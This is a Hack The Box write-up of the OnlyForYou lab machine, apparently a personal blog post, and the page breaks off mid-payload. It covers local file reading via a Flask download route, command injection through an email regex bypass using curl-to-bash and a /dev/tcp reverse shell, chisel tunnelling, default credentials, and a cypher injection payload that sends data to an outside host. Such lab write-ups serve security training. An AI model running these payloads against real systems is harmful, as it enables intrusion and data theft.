<!doctype html><html lang=en-us><head><title>Hackthebox Onlyforyou | Achla | Inf0Sec</title><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge,chrome=1"><meta name=viewport content="width=device-width,minimum-scale=1"><meta name=description content="The first step is exploiting a vulnerability in the source code of a Python application to read a local file (LFI).
This reveals another misconfiguration, which allows us to bypass regex verification and achieve remote code execution.
We then use cypher injection to get the user flag.
Finally, we exploit Python pip download vulnerabilities to escalate to root."><meta name=generator content="Hugo 0.111.3"><meta name=ROBOTS content="NOINDEX, NOFOLLOW"><link rel=stylesheet href=/css/style.css><link rel="shortcut icon" href=/images/favicon.ico type=image/x-icon></head><body><nav class=navigation><a href=/><span class=arrow>‚Üê</span>Home</a>
<a href=/posts>Archive</a>
<a href=/about>About</a></nav><main class=main><section id=single><h1 class=title>Hackthebox Onlyforyou</h1><div class=tip><time datetime="2023-04-26 22:02:29 +0200 +0200">Apr 26, 2023</time>
<span class=split>¬∑</span>
<span>1751 words</span>
<span class=split>¬∑</span>
<span>9 minute read</span></div><aside class=toc><details><summary>Table of Contents</summary><div><nav id=TableOfContents><ul><li><a href=#nmap><strong>Nmap</strong></a></li><li><a href=#http80><strong>HTTP:80</strong></a></li><li><a href=#shell-as-john><strong>Shell as john</strong></a></li><li><a href=#shell-as-root><strong>Shell as root</strong></a><ul><li><a href=#setuppy-file><strong>Setup.py file</strong></a></li></ul></li></ul></nav></div></details></aside><div class=content><p>The first step is exploiting a vulnerability in the source code of a Python application to read a local file (LFI).
This reveals another misconfiguration, which allows us to bypass regex verification and achieve remote code execution.
We then use cypher injection to get the user flag.
Finally, we exploit Python pip download vulnerabilities to escalate to root.</p><h2 id=nmap><strong>Nmap</strong> <a href=#nmap class=anchor>üîó</a></h2><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span># Nmap 7.93 scan initiated Sat Apr 22 21:39:58 2023 as: nmap -sC -sV -o nmap.txt 10.129.210.146
</span></span><span style=display:flex><span>Nmap scan report for 10.129.210.146
</span></span><span style=display:flex><span>Host is up (0.078s latency).
</span></span><span style=display:flex><span>Not shown: 998 closed tcp ports (conn-refused)
</span></span><span style=display:flex><span>PORT   STATE SERVICE VERSION
</span></span><span style=display:flex><span>22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
</span></span><span style=display:flex><span>| ssh-hostkey:
</span></span><span style=display:flex><span>|   3072 e883e0a9fd43df38198aaa35438411ec (RSA)
</span></span><span style=display:flex><span>|   256 83f235229b03860c16cfb3fa9f5acd08 (ECDSA)
</span></span><span style=display:flex><span>|_  256 445f7aa377690a77789b04e09f11db80 (ED25519)
</span></span><span style=display:flex><span>80/tcp open  http    nginx 1.18.0 (Ubuntu)
</span></span><span style=display:flex><span>|_http-server-header: nginx/1.18.0 (Ubuntu)
</span></span><span style=display:flex><span>|_http-title: Did not follow redirect to http://only4you.htb/
</span></span><span style=display:flex><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span># Nmap done at Sat Apr 22 21:40:10 2023 -- 1 IP address (1 host up) scanned in 12.03 seconds
</span></span></code></pre></div><h2 id=http80><strong>HTTP:80</strong> <a href=#http80 class=anchor>üîó</a></h2><p>The nmap scan shows only two open ports: 22 for ssh and 80 for http.
The website on port 80 seems like a typical company website that offers services, but we notice a beta subdomain where we can test their beta products.</p><p><p class=markdown-image><img src=/only4you_beta.png alt="image text"></p></p><p>Luckily we can download the source code and it&rsquo;s a python flask application which contains the vulnerable function we can exploit.
Here is the vulnerable function in the code:</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span><span style=color:#a2f>@app.route</span>(<span style=color:#b44>&#39;/download&#39;</span>, methods<span style=color:#666>=</span>[<span style=color:#b44>&#39;POST&#39;</span>])
</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>def</span> <span style=color:#00a000>download</span>():
</span></span><span style=display:flex><span>    image <span style=color:#666>=</span> request<span style=color:#666>.</span>form[<span style=color:#b44>&#39;image&#39;</span>]
</span></span><span style=display:flex><span>    filename <span style=color:#666>=</span> posixpath<span style=color:#666>.</span>normpath(image)
</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>if</span> <span style=color:#b44>&#39;..&#39;</span> <span style=color:#a2f;font-weight:700>in</span> filename <span style=color:#a2f;font-weight:700>or</span> filename<span style=color:#666>.</span>startswith(<span style=color:#b44>&#39;../&#39;</span>):
</span></span><span style=display:flex><span>        flash(<span style=color:#b44>&#39;Hacking detected!&#39;</span>, <span style=color:#b44>&#39;danger&#39;</span>)
</span></span><span style=display:flex><span>        <span style=color:#a2f;font-weight:700>return</span> redirect(<span style=color:#b44>&#39;/list&#39;</span>)
</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>if</span> <span style=color:#a2f;font-weight:700>not</span> os<span style=color:#666>.</span>path<span style=color:#666>.</span>isabs(filename):
</span></span><span style=display:flex><span>        filename <span style=color:#666>=</span> os<span style=color:#666>.</span>path<span style=color:#666>.</span>join(app<span style=color:#666>.</span>config[<span style=color:#b44>&#39;LIST_FOLDER&#39;</span>], filename)
</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>try</span>:
</span></span><span style=display:flex><span>        <span style=color:#a2f;font-weight:700>if</span> <span style=color:#a2f;font-weight:700>not</span> os<span style=color:#666>.</span>path<span style=color:#666>.</span>isfile(filename):
</span></span><span style=display:flex><span>            flash(<span style=color:#b44>&#39;Image doesn</span><span style=color:#b62;font-weight:700>\&#39;</span><span style=color:#b44>t exist!&#39;</span>, <span style=color:#b44>&#39;danger&#39;</span>)
</span></span><span style=display:flex><span>            <span style=color:#a2f;font-weight:700>return</span> redirect(<span style=color:#b44>&#39;/list&#39;</span>)
</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>except</span> (<span style=color:#d2413a;font-weight:700>TypeError</span>, <span style=color:#d2413a;font-weight:700>ValueError</span>):
</span></span><span style=display:flex><span>        <span style=color:#a2f;font-weight:700>raise</span> BadRequest()
</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>return</span> send_file(filename, as_attachment<span style=color:#666>=</span><span style=color:#a2f;font-weight:700>True</span>)
</span></span></code></pre></div><p>This means that we are able to do <code>/etc/passwd</code> and the file will be displayed:</p><p><p class=markdown-image><img src=/only4you_lfi.png alt="image text"></p></p><p>The vulnerable function allows us to read files on the system. We take advantage of this to view the nginx configuration file. By requesting /download on beta.only4you.htb with the image parameter set to /var/www/only4you.htb/app.py, we are able to retrieve the source code of the Python application running on only4you.htb. This reveals that we can send a message with the app, but only authorized users are allowed to do so.</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>server {
</span></span><span style=display:flex><span>    listen 80;
</span></span><span style=display:flex><span>    return 301 http://only4you.htb$request_uri;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>server {
</span></span><span style=display:flex><span>	listen 80;
</span></span><span style=display:flex><span>	server_name only4you.htb;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	location / {
</span></span><span style=display:flex><span>                include proxy_params;
</span></span><span style=display:flex><span>                proxy_pass http://unix:/var/www/only4you.htb/only4you.sock;
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>server {
</span></span><span style=display:flex><span>	listen 80;
</span></span><span style=display:flex><span>	server_name beta.only4you.htb;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        location / {
</span></span><span style=display:flex><span>                include proxy_params;
</span></span><span style=display:flex><span>                proxy_pass http://unix:/var/www/beta.only4you.htb/beta.sock;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>A python application is also running on only4you.htb since there is an app.py file:</p><p><code>curl -X POST http://beta.only4you.htb/download --data 'image=/var/www/only4you.htb/app.py'</code></p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span><span style=color:#a2f;font-weight:700>from</span> <span style=color:#00f;font-weight:700>flask</span> <span style=color:#a2f;font-weight:700>import</span> Flask, render_template, request, flash, redirect
</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>from</span> <span style=color:#00f;font-weight:700>form</span> <span style=color:#a2f;font-weight:700>import</span> sendmessage
</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>import</span> <span style=color:#00f;font-weight:700>uuid</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>app <span style=color:#666>=</span> Flask(__name__)
</span></span><span style=display:flex><span>app<span style=color:#666>.</span>secret_key <span style=color:#666>=</span> uuid<span style=color:#666>.</span>uuid4()<span style=color:#666>.</span>hex
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a2f>@app.route</span>(<span style=color:#b44>&#39;/&#39;</span>, methods<span style=color:#666>=</span>[<span style=color:#b44>&#39;GET&#39;</span>, <span style=color:#b44>&#39;POST&#39;</span>])
</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>def</span> <span style=color:#00a000>index</span>():
</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>if</span> request<span style=color:#666>.</span>method <span style=color:#666>==</span> <span style=color:#b44>&#39;POST&#39;</span>:
</span></span><span style=display:flex><span>        email <span style=color:#666>=</span> request<span style=color:#666>.</span>form[<span style=color:#b44>&#39;email&#39;</span>]
</span></span><span style=display:flex><span>        subject <span style=color:#666>=</span> request<span style=color:#666>.</span>form[<span style=color:#b44>&#39;subject&#39;</span>]
</span></span><span style=display:flex><span>        message <span style=color:#666>=</span> request<span style=color:#666>.</span>form[<span style=color:#b44>&#39;message&#39;</span>]
</span></span><span style=display:flex><span>        ip <span style=color:#666>=</span> request<span style=color:#666>.</span>remote_addr
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        status <span style=color:#666>=</span> sendmessage(email, subject, message, ip)
</span></span><span style=display:flex><span>        <span style=color:#a2f;font-weight:700>if</span> status <span style=color:#666>==</span> <span style=color:#666>0</span>:
</span></span><span style=display:flex><span>            flash(<span style=color:#b44>&#39;Something went wrong!&#39;</span>, <span style=color:#b44>&#39;danger&#39;</span>)
</span></span><span style=display:flex><span>        <span style=color:#a2f;font-weight:700>elif</span> status <span style=color:#666>==</span> <span style=color:#666>1</span>:
</span></span><span style=display:flex><span>            flash(<span style=color:#b44>&#39;You are not authorized!&#39;</span>, <span style=color:#b44>&#39;danger&#39;</span>)
</span></span><span style=display:flex><span>        <span style=color:#a2f;font-weight:700>else</span>:
</span></span><span style=display:flex><span>            flash(<span style=color:#b44>&#39;Your message was successfuly sent! We will reply as soon as possible.&#39;</span>, <span style=color:#b44>&#39;success&#39;</span>)
</span></span><span style=display:flex><span>        <span style=color:#a2f;font-weight:700>return</span> redirect(<span style=color:#b44>&#39;/#contact&#39;</span>)
</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>else</span>:
</span></span><span style=display:flex><span>        <span style=color:#a2f;font-weight:700>return</span> render_template(<span style=color:#b44>&#39;index.html&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a2f>@app.errorhandler</span>(<span style=color:#666>404</span>)
</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>def</span> <span style=color:#00a000>page_not_found</span>(error):
</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>return</span> render_template(<span style=color:#b44>&#39;404.html&#39;</span>), <span style=color:#666>404</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a2f>@app.errorhandler</span>(<span style=color:#666>500</span>)
</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>def</span> <span style=color:#00a000>server_errorerror</span>(error):
</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>return</span> render_template(<span style=color:#b44>&#39;500.html&#39;</span>), <span style=color:#666>500</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a2f>@app.errorhandler</span>(<span style=color:#666>400</span>)
</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>def</span> <span style=color:#00a000>bad_request</span>(error):
</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>return</span> render_template(<span style=color:#b44>&#39;400.html&#39;</span>), <span style=color:#666>400</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a2f>@app.errorhandler</span>(<span style=color:#666>405</span>)
</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>def</span> <span style=color:#00a000>method_not_allowed</span>(error):
</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>return</span> render_template(<span style=color:#b44>&#39;405.html&#39;</span>), <span style=color:#666>405</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>if</span> __name__ <span style=color:#666>==</span> <span style=color:#b44>&#39;__main__&#39;</span>:
</span></span><span style=display:flex><span>    app<span style=color:#666>.</span>run(host<span style=color:#666>=</span><span style=color:#b44>&#39;127.0.0.1&#39;</span>, port<span style=color:#666>=</span><span style=color:#666>80</span>, debug<span style=color:#666>=</span><span style=color:#a2f;font-weight:700>False</span>)
</span></span></code></pre></div><p>Basically the app.py file shows us that a POST request is made when submitting the form on the main page.
Here the interesting file in form.py since the app imports it we can see his content:</p><p><code>curl -X POST http://beta.only4you.htb/download --data 'image=/var/www/only4you.htb/form.py'</code></p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span><span style=color:#a2f;font-weight:700>import</span> <span style=color:#00f;font-weight:700>smtplib</span><span style=color:#666>,</span> <span style=color:#00f;font-weight:700>re</span>
</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>from</span> <span style=color:#00f;font-weight:700>email.message</span> <span style=color:#a2f;font-weight:700>import</span> EmailMessage
</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>from</span> <span style=color:#00f;font-weight:700>subprocess</span> <span style=color:#a2f;font-weight:700>import</span> PIPE, run
</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>import</span> <span style=color:#00f;font-weight:700>ipaddress</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>def</span> <span style=color:#00a000>issecure</span>(email, ip):
</span></span><span style=display:flex><span>        <span style=color:#a2f;font-weight:700>if</span> <span style=color:#a2f;font-weight:700>not</span> re<span style=color:#666>.</span>match(<span style=color:#b44>&#34;([A-Za-z0-9]+[.-_])*[A-Za-z0-9]+@[A-Za-z0-9-]+(\.[A-Z|a-z]{2,})&#34;</span>, email):
</span></span><span style=display:flex><span>                <span style=color:#a2f;font-weight:700>return</span> <span style=color:#666>0</span>
</span></span><span style=display:flex><span>        <span style=color:#a2f;font-weight:700>else</span>:
</span></span><span style=display:flex><span>                domain <span style=color:#666>=</span> email<span style=color:#666>.</span>split(<span style=color:#b44>&#34;@&#34;</span>, <span style=color:#666>1</span>)[<span style=color:#666>1</span>]
</span></span><span style=display:flex><span>                result <span style=color:#666>=</span> run([<span style=color:#b44>f</span><span style=color:#b44>&#34;dig txt </span><span style=color:#b68;font-weight:700>{</span>domain<span style=color:#b68;font-weight:700>}</span><span style=color:#b44>&#34;</span>], shell<span style=color:#666>=</span><span style=color:#a2f;font-weight:700>True</span>, stdout<span style=color:#666>=</span>PIPE)
</span></span><span style=display:flex><span>                output <span style=color:#666>=</span> result<span style=color:#666>.</span>stdout<span style=color:#666>.</span>decode(<span style=color:#b44>&#39;utf-8&#39;</span>)
</span></span><span style=display:flex><span>                <span style=color:#a2f;font-weight:700>if</span> <span style=color:#b44>&#34;v=spf1&#34;</span> <span style=color:#a2f;font-weight:700>not</span> <span style=color:#a2f;font-weight:700>in</span> output:
</span></span><span style=display:flex><span>                        <span style=color:#a2f;font-weight:700>return</span> <span style=color:#666>1</span>
</span></span><span style=display:flex><span>                <span style=color:#a2f;font-weight:700>else</span>:
</span></span><span style=display:flex><span>                        domains <span style=color:#666>=</span> []
</span></span><span style=display:flex><span>                        ips <span style=color:#666>=</span> []
</span></span><span style=display:flex><span>                        <span style=color:#a2f;font-weight:700>if</span> <span style=color:#b44>&#34;include:&#34;</span> <span style=color:#a2f;font-weight:700>in</span> output:
</span></span><span style=display:flex><span>                                dms <span style=color:#666>=</span> <span style=color:#b44>&#39;&#39;</span><span style=color:#666>.</span>join(re<span style=color:#666>.</span>findall(<span style=color:#b44>r</span><span style=color:#b44>&#34;include:.*\.[A-Z|a-z]{2,}&#34;</span>, output))<span style=color:#666>.</span>split(<span style=color:#b44>&#34;include:&#34;</span>)
</span></span><span style=display:flex><span>                                dms<span style=color:#666>.</span>pop(<span style=color:#666>0</span>)
</span></span><span style=display:flex><span>                                <span style=color:#a2f;font-weight:700>for</span> domain <span style=color:#a2f;font-weight:700>in</span> dms:
</span></span><span style=display:flex><span>                                        domains<span style=color:#666>.</span>append(domain)
</span></span><span style=display:flex><span>                                <span style=color:#a2f;font-weight:700>while</span> <span style=color:#a2f;font-weight:700>True</span>:
</span></span><span style=display:flex><span>                                        <span style=color:#a2f;font-weight:700>for</span> domain <span style=color:#a2f;font-weight:700>in</span> domains:
</span></span><span style=display:flex><span>                                                result <span style=color:#666>=</span> run([<span style=color:#b44>f</span><span style=color:#b44>&#34;dig txt </span><span style=color:#b68;font-weight:700>{</span>domain<span style=color:#b68;font-weight:700>}</span><span style=color:#b44>&#34;</span>], shell<span style=color:#666>=</span><span style=color:#a2f;font-weight:700>True</span>, stdout<span style=color:#666>=</span>PIPE)
</span></span><span style=display:flex><span>                                                output <span style=color:#666>=</span> result<span style=color:#666>.</span>stdout<span style=color:#666>.</span>decode(<span style=color:#b44>&#39;utf-8&#39;</span>)
</span></span><span style=display:flex><span>                                                <span style=color:#a2f;font-weight:700>if</span> <span style=color:#b44>&#34;include:&#34;</span> <span style=color:#a2f;font-weight:700>in</span> output:
</span></span><span style=display:flex><span>                                                        dms <span style=color:#666>=</span> <span style=color:#b44>&#39;&#39;</span><span style=color:#666>.</span>join(re<span style=color:#666>.</span>findall(<span style=color:#b44>r</span><span style=color:#b44>&#34;include:.*\.[A-Z|a-z]{2,}&#34;</span>, output))<span style=color:#666>.</span>split(<span style=color:#b44>&#34;include:&#34;</span>)
</span></span><span style=display:flex><span>                                                        domains<span style=color:#666>.</span>clear()
</span></span><span style=display:flex><span>                                                        <span style=color:#a2f;font-weight:700>for</span> domain <span style=color:#a2f;font-weight:700>in</span> dms:
</span></span><span style=display:flex><span>                                                                domains<span style=color:#666>.</span>append(domain)
</span></span><span style=display:flex><span>                                                <span style=color:#a2f;font-weight:700>elif</span> <span style=color:#b44>&#34;ip4:&#34;</span> <span style=color:#a2f;font-weight:700>in</span> output:
</span></span><span style=display:flex><span>                                                        ipaddresses <span style=color:#666>=</span> <span style=color:#b44>&#39;&#39;</span><span style=color:#666>.</span>join(re<span style=color:#666>.</span>findall(<span style=color:#b44>r</span><span style=color:#b44>&#34;ip4:+[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+[/]?[0-9]</span><span style=color:#b68;font-weight:700>{2}</span><span style=color:#b44>&#34;</span>, output))<span style=color:#666>.</span>split(<span style=color:#b44>&#34;ip4:&#34;</span>)
</span></span><span style=display:flex><span>                                                        ipaddresses<span style=color:#666>.</span>pop(<span style=color:#666>0</span>)
</span></span><span style=display:flex><span>                                                        <span style=color:#a2f;font-weight:700>for</span> i <span style=color:#a2f;font-weight:700>in</span> ipaddresses:
</span></span><span style=display:flex><span>                                                                ips<span style=color:#666>.</span>append(i)
</span></span><span style=display:flex><span>                                                <span style=color:#a2f;font-weight:700>else</span>:
</span></span><span style=display:flex><span>                                                        <span style=color:#a2f;font-weight:700>pass</span>
</span></span><span style=display:flex><span>                                        <span style=color:#a2f;font-weight:700>break</span>
</span></span><span style=display:flex><span>                        <span style=color:#a2f;font-weight:700>elif</span> <span style=color:#b44>&#34;ip4&#34;</span> <span style=color:#a2f;font-weight:700>in</span> output:
</span></span><span style=display:flex><span>                                ipaddresses <span style=color:#666>=</span> <span style=color:#b44>&#39;&#39;</span><span style=color:#666>.</span>join(re<span style=color:#666>.</span>findall(<span style=color:#b44>r</span><span style=color:#b44>&#34;ip4:+[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+[/]?[0-9]</span><span style=color:#b68;font-weight:700>{2}</span><span style=color:#b44>&#34;</span>, output))<span style=color:#666>.</span>split(<span style=color:#b44>&#34;ip4:&#34;</span>)
</span></span><span style=display:flex><span>                                ipaddresses<span style=color:#666>.</span>pop(<span style=color:#666>0</span>)
</span></span><span style=display:flex><span>                                <span style=color:#a2f;font-weight:700>for</span> i <span style=color:#a2f;font-weight:700>in</span> ipaddresses:
</span></span><span style=display:flex><span>                                        ips<span style=color:#666>.</span>append(i)
</span></span><span style=display:flex><span>                        <span style=color:#a2f;font-weight:700>else</span>:
</span></span><span style=display:flex><span>                                <span style=color:#a2f;font-weight:700>return</span> <span style=color:#666>1</span>
</span></span><span style=display:flex><span>                <span style=color:#a2f;font-weight:700>for</span> i <span style=color:#a2f;font-weight:700>in</span> ips:
</span></span><span style=display:flex><span>                        <span style=color:#a2f;font-weight:700>if</span> ip <span style=color:#666>==</span> i:
</span></span><span style=display:flex><span>                                <span style=color:#a2f;font-weight:700>return</span> <span style=color:#666>2</span>
</span></span><span style=display:flex><span>                        <span style=color:#a2f;font-weight:700>elif</span> ipaddress<span style=color:#666>.</span>ip_address(ip) <span style=color:#a2f;font-weight:700>in</span> ipaddress<span style=color:#666>.</span>ip_network(i):
</span></span><span style=display:flex><span>                                <span style=color:#a2f;font-weight:700>return</span> <span style=color:#666>2</span>
</span></span><span style=display:flex><span>                        <span style=color:#a2f;font-weight:700>else</span>:
</span></span><span style=display:flex><span>                                <span style=color:#a2f;font-weight:700>return</span> <span style=color:#666>1</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>def</span> <span style=color:#00a000>sendmessage</span>(email, subject, message, ip):
</span></span><span style=display:flex><span>        status <span style=color:#666>=</span> issecure(email, ip)
</span></span><span style=display:flex><span>        <span style=color:#a2f;font-weight:700>if</span> status <span style=color:#666>==</span> <span style=color:#666>2</span>:
</span></span><span style=display:flex><span>                msg <span style=color:#666>=</span> EmailMessage()
</span></span><span style=display:flex><span>                msg[<span style=color:#b44>&#39;From&#39;</span>] <span style=color:#666>=</span> <span style=color:#b44>f</span><span style=color:#b44>&#39;</span><span style=color:#b68;font-weight:700>{</span>email<span style=color:#b68;font-weight:700>}</span><span style=color:#b44>&#39;</span>
</span></span><span style=display:flex><span>                msg[<span style=color:#b44>&#39;To&#39;</span>] <span style=color:#666>=</span> <span style=color:#b44>&#39;info@only4you.htb&#39;</span>
</span></span><span style=display:flex><span>                msg[<span style=color:#b44>&#39;Subject&#39;</span>] <span style=color:#666>=</span> <span style=color:#b44>f</span><span style=color:#b44>&#39;</span><span style=color:#b68;font-weight:700>{</span>subject<span style=color:#b68;font-weight:700>}</span><span style=color:#b44>&#39;</span>
</span></span><span style=display:flex><span>                msg[<span style=color:#b44>&#39;Message&#39;</span>] <span style=color:#666>=</span> <span style=color:#b44>f</span><span style=color:#b44>&#39;</span><span style=color:#b68;font-weight:700>{</span>message<span style=color:#b68;font-weight:700>}</span><span style=color:#b44>&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>                smtp <span style=color:#666>=</span> smtplib<span style=color:#666>.</span>SMTP(host<span style=color:#666>=</span><span style=color:#b44>&#39;localhost&#39;</span>, port<span style=color:#666>=</span><span style=color:#666>25</span>)
</span></span><span style=display:flex><span>                smtp<span style=color:#666>.</span>send_message(msg)
</span></span><span style=display:flex><span>                smtp<span style=color:#666>.</span>quit()
</span></span><span style=display:flex><span>                <span style=color:#a2f;font-weight:700>return</span> status
</span></span><span style=display:flex><span>        <span style=color:#a2f;font-weight:700>elif</span> status <span style=color:#666>==</span> <span style=color:#666>1</span>:
</span></span><span style=display:flex><span>                <span style=color:#a2f;font-weight:700>return</span> status
</span></span><span style=display:flex><span>        <span style=color:#a2f;font-weight:700>else</span>:
</span></span><span style=display:flex><span>                <span style=color:#a2f;font-weight:700>return</span> status
</span></span></code></pre></div><p>The vulnerability is there:</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span> result <span style=color:#666>=</span> run([<span style=color:#b44>f</span><span style=color:#b44>&#34;dig txt </span><span style=color:#b68;font-weight:700>{</span>domain<span style=color:#b68;font-weight:700>}</span><span style=color:#b44>&#34;</span>], shell<span style=color:#666>=</span><span style=color:#a2f;font-weight:700>True</span>, stdout<span style=color:#666>=</span>PIPE)
</span></span></code></pre></div><p>Since we can perform a command injection but to do it we first need to bypass the regex validation on the email.
My payload to bypass the regex is: <code>test@test.com@;curl%2010.10.14.203/rev.sh%20|bash;mail.com</code> (of course much simpler payload exist try by yourself)
and the content of rev.sh file is just a bash reverse shell:</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#080>#!/bin/bash
</span></span></span><span style=display:flex><span><span style=color:#080></span>
</span></span><span style=display:flex><span>/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.203/6666 0&gt;&amp;<span style=color:#666>1</span>
</span></span></code></pre></div><p>After sending the request using curl we successfully get a reverse shell as www-data</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>rlwrap nc -lnvp <span style=color:#666>6666</span>
</span></span><span style=display:flex><span>listening on <span style=color:#666>[</span>any<span style=color:#666>]</span> <span style=color:#666>6666</span> ...
</span></span><span style=display:flex><span>connect to <span style=color:#666>[</span>10.10.14.66<span style=color:#666>]</span> from <span style=color:#666>(</span>UNKNOWN<span style=color:#666>)</span> <span style=color:#666>[</span>10.10.11.210<span style=color:#666>]</span> <span style=color:#666>35818</span>
</span></span><span style=display:flex><span>bash: cannot <span style=color:#a2f>set</span> terminal process group <span style=color:#666>(</span>1010<span style=color:#666>)</span>: Inappropriate ioctl <span style=color:#a2f;font-weight:700>for</span> device
</span></span><span style=display:flex><span>bash: no job control in this shell
</span></span><span style=display:flex><span>www-data@only4you:~/only4you.htb$ id
</span></span><span style=display:flex><span>id
</span></span><span style=display:flex><span><span style=color:#b8860b>uid</span><span style=color:#666>=</span>33<span style=color:#666>(</span>www-data<span style=color:#666>)</span> <span style=color:#b8860b>gid</span><span style=color:#666>=</span>33<span style=color:#666>(</span>www-data<span style=color:#666>)</span> <span style=color:#b8860b>groups</span><span style=color:#666>=</span>33<span style=color:#666>(</span>www-data<span style=color:#666>)</span>
</span></span></code></pre></div><h2 id=shell-as-john><strong>Shell as john</strong> <a href=#shell-as-john class=anchor>üîó</a></h2><p>By using <code>netstat</code> we see several open ports locally: <code>3000</code>,<code>8001</code> and <code>7474</code>.
So let&rsquo;s forward these ports with chisel !
In order to do this I&rsquo;ll use socks proxy so I can forward all the ports:</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#080;font-style:italic># On the attacker machine</span>
</span></span><span style=display:flex><span>./chisel server --reverse --socks5 -p <span style=color:#666>8000</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#080;font-style:italic>#On the victim session</span>
</span></span><span style=display:flex><span>./chisel client YOUR_IP:8000 R:socks
</span></span></code></pre></div><p>Now I&rsquo;ll go straight forward, the vulnerable port here is the port number <code>8001</code></p><p><p class=markdown-image><img src=/only4you_8001.png alt="image text"></p></p><p>This web app is vulnerable because the default credential are admin/admin. Once we‚Äôve logged in, we jump on a dashboard.
The dashboard isn‚Äôt really interesting here, so let‚Äôs move on to the employees section.</p><p><p class=markdown-image><img src=/only4you_8001_employee.png alt="image text"></p></p><p>I&rsquo;ve forgotten to tell that the database for this web application is using neo4j so it may be vulnerable to cypher injection !
For this we have excellent resources on <a href=https://book.hacktricks.xyz/pentesting-web/sql-injection/cypher-injection-neo4j#common-cypher-injections target=_blank rel=noopener>HackTrick</a>.</p><p>We can try to get the version of the server with the following payload:</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>&#39; OR 1=1 WITH 1 as a  CALL dbms.components() YIELD name, versions, edition UNWIND versions as version LOAD CSV FROM &#39;http://10.0.2.4:8000/?version=&#39; + version + &#39;&amp;name=&#39; + name + &#39;&amp;edition=&#39; + edition as l RETURN 0 as _0 //
